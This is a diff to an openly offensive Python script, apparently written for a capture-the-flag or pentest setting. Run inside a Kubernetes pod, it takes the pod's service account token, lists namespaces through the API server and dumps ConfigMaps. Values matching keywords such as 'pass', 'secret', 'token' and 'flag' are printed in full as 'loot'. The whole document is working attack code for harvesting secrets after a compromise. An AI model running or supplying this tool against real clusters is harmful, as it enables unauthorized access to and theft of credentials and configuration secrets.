@@ -1,5 +1,5 @@
 python3 - <<'EOF'
-import os, sys, json, ssl
+import os, sys, json, ssl, time
 from urllib.request import Request, urlopen
 
 # === CONFIGURATION ===
@@ -10,13 +10,33 @@ APISERVER = "https://kubernetes.default.svc"
 
 # === VISUALS ===
 class C:
-    G = "\033[92m"; Y = "\033[93m"; B = "\033[94m"; C = "\033[96m"; R = "\033[91m"; E = "\033[0m"
+    G = "\033[92m"; R = "\033[91m"; Y = "\033[93m"; B = "\033[94m"; C = "\033[96m"; M = "\033[95m"; E = "\033[0m"
+    BOLD = "\033[1m"
+
+def section(title):
+    print(f"\n{C.B}{'='*40}{C.E}")
+    print(f"{C.B} {title}{C.E}")
+    print(f"{C.B}{'='*40}{C.E}")
+    time.sleep(0.5)
+
+def info(msg):
+    print(f"{C.C}[*] {msg}{C.E}")
+    time.sleep(0.1)
+
+def success(msg):
+    print(f"{C.G}[+] {msg}{C.E}")
+    time.sleep(0.1)
+
+def fail(msg):
+    print(f"{C.R}[-] {msg}{C.E}")
 
 # === SETUP ===
 if not os.path.exists(TOKEN_PATH):
-    print(f"{C.R}❌ FATAL: No Service Account found.{C.E}"); sys.exit(1)
+    fail("FATAL: No Service Account found.")
+    sys.exit(1)
 
 with open(TOKEN_PATH) as f: TOKEN = f.read().strip()
+with open(os.path.join(SA_PATH, "namespace")) as f: MY_NS = f.read().strip()
 SSL_CTX = ssl.create_default_context(cafile=CACERT_PATH)
 
 def k8s_api(path):
@@ -27,64 +47,82 @@ def k8s_api(path):
             return json.loads(res.read())
     except Exception: return None
 
-# === 1. DISCOVER NAMESPACES ===
-print(f"{C.B}=== 1. DISCOVERING NAMESPACES ==={C.E}")
-namespaces = []
+# === MAIN LOGIC ===
+print(f"\n{C.M}   >>> K8s DYNAMIC ENUMERATOR v5.0 <<<{C.E}")
+print(f"   Pod Namespace: {C.BOLD}{MY_NS}{C.E}")
+time.sleep(1)
 
-# Try API listing
+# --- 1. NAMESPACES ---
+section("1. DISCOVERING TARGET NAMESPACES")
+info(" querying API for namespace list...")
+
+namespaces = []
 resp = k8s_api("/api/v1/namespaces")
+
 if resp and "items" in resp:
     namespaces = [item["metadata"]["name"] for item in resp["items"]]
-    print(f"  ✅ Found {len(namespaces)} namespaces via API.")
+    success(f"API Access Granted! Found {len(namespaces)} namespaces.")
 else:
-    print(f"  ❌ Cannot list namespaces API. Falling back to current.")
-    try:
-        with open(os.path.join(SA_PATH, "namespace")) as f:
-            namespaces.append(f.read().strip())
-    except: pass
+    fail("API Access Denied for namespace listing.")
+    info("Falling back to local namespace only.")
+    namespaces = [MY_NS]
 
-print(f"  Targets: {C.C}{', '.join(namespaces)}{C.E}")
+print(f"\n   Targets identified: {C.Y}{', '.join(namespaces)}{C.E}")
+time.sleep(1.5)
 
-# === 2. LOOT CONFIGMAPS ===
-print(f"\n{C.B}=== 2. CONFIGMAP DUMPER ==={C.E}")
+# --- 2. CONFIGMAP LOOTING ---
+section("2. LOOTING CONFIGMAPS")
+info("Scanning all identified namespaces for config data...")
+time.sleep(1)
 
 for ns in namespaces:
     print(f"\n{C.C}📂 Namespace: {ns}{C.E}")
+    print(f"   {'-'*30}")
     
-    # Try to list ConfigMaps in this namespace
+    # Try to fetch
     cm_resp = k8s_api(f"/api/v1/namespaces/{ns}/configmaps")
     
     if not cm_resp or "items" not in cm_resp:
-        print(f"  ❌ Access Denied")
+        fail(f"Access Denied to ConfigMaps in '{ns}'")
+        time.sleep(0.2)
         continue
 
-    count = len(cm_resp['items'])
-    if count == 0:
-        print(f"  (Empty)")
-        continue
-
-    print(f"  ✅ Found {count} ConfigMaps")
+    items = cm_resp['items']
+    count = len(items)
     
-    for cm in cm_resp['items']:
+    if count == 0:
+        print(f"   (No ConfigMaps found)")
+        continue
+
+    success(f"Found {count} ConfigMaps! Analyzing content...")
+    
+    for cm in items:
         name = cm['metadata']['name']
-        if name == "kube-root-ca.crt": continue # Skip noise
+        if name == "kube-root-ca.crt": continue 
         
-        print(f"    📄 {C.Y}{name}{C.E}")
+        print(f"   > File: {C.BOLD}{name}{C.E}")
         
         if "data" in cm:
             for key, val in cm["data"].items():
-                # Heuristic: Check for secrets
-                is_sus = any(x in val.lower() or x in key.lower() for x in ["flag", "pass", "key", "secret", "user", "admin", "token"])
+                # Check for sensitive keywords
+                keywords = ["flag", "pass", "key", "secret", "user", "admin", "token", "jwt", "auth"]
+                is_sus = any(k in val.lower() or k in key.lower() for k in keywords)
                 
                 if is_sus:
-                    print(f"      🚨 {C.G}POSSIBLE LOOT ({key}):{C.E}")
-                    print(f"      {val}")
+                    print(f"     🚨 {C.G}POTENTIAL FLAG/SECRET FOUND ({key}):{C.E}")
+                    print(f"{C.G}{'-'*20}{C.E}")
+                    print(f"{val.strip()}")
+                    print(f"{C.G}{'-'*20}{C.E}")
+                    time.sleep(0.5) # Pause to let the user see the loot
                 else:
-                    preview = val[:80].replace('\n', ' ')
-                    if len(val) > 80: preview += "..."
-                    print(f"      {key}: {preview}")
+                    preview = val[:60].replace('\n', ' ')
+                    if len(val) > 60: preview += "..."
+                    print(f"     - {key}: {preview}")
         else:
-            print("      (No data)")
+            print("     (No data keys)")
+    
+    time.sleep(0.5)
 
-print(f"\n{C.G}Done.{C.E}")
+section("SCAN COMPLETE")
+print(f"{C.G}Enumeration finished.{C.E}")
 EOF
